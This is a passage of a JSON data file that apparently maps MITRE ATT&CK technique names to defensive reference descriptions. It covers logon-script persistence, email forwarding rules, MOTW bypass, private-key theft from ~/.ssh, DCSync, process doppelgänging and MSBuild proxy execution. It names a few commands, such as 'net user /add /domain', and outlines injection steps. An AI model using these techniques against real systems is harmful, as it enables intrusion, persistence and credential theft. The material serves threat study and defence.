    "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware."
  ],
  "boot or logon initialization scripts: logon script (windows)": [
    "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. "
  ],
  "software deployment tools": [
    "Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).\n\nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose."
  ],
  "email collection: email forwarding rule": [
    "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)"
  ],
  "subvert trust controls: mark-of-the-web bypass": [
    "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file in not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)"
  ],
  "unsecured credentials: private keys": [
    "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line."
  ],
  "exfiltration over web service": [
    "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection."
  ],
  "phishing for information": [
    "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages."
  ],
  "obtain capabilities: vulnerabilities": [
    "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004))."
  ],
  "search open websites/domains": [
    "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566))."
  ],
  "data obfuscation: steganography": [
    "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. "
  ],
  "brute force: credential stuffing": [
    "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)"
  ],
  "create account: domain account": [
    "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
  ],
  "indirect command execution": [
    "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads."
  ],
  "defacement: external defacement": [
    "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)"
  ],
  "compromise infrastructure: botnet": [
    "Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS)."
  ],
  "endpoint denial of service": [
    "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n"
  ],
  "hijack execution flow: kernelcallbacktable": [
    "Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process."
  ],
  "gather victim org information: identify roles": [
    "Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566))."
  ],
  "server software component: transport agent": [
    "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. "
  ],
  "endpoint denial of service: application or system exploitation": [
    "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. "
  ],
  "hijack execution flow: services file permissions weakness": [
    "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence."
  ],
  "obtain capabilities: malware": [
    "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries)."
  ],
  "unsecured credentials": [
    "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004))."
  ],
  "resource hijacking": [
    "Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems, which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro War of Crypto Miners)\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR)"
  ],
  "gather victim identity information: credentials": [
    "Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries may also purchase credentials from dark web or other black-markets. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078))."
  ],
  "domain policy modification: domain trust modification": [
    "Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert a domain to a federated domain, which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) "
  ],
  "system location discovery": [
    "\nAdversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)"
  ],
  "use alternate authentication material": [
    "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n"
  ],
  "rootkit": [
    "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)"
  ],
  "email collection: local email collection": [
    "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files)"
  ],
  "data obfuscation: junk data": [
    "Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. "
  ],
  "os credential dumping: dcsync": [
    "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)"
  ],
  "process injection: process doppelg\u00e4nging": [
    "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nProcess Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):\n\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "indicator removal on host: network share connection removal": [
    "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use)"
  ],
  "trusted developer utilities proxy execution: msbuild": [
    "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)"
  ],
  "office application startup: office template macros": [
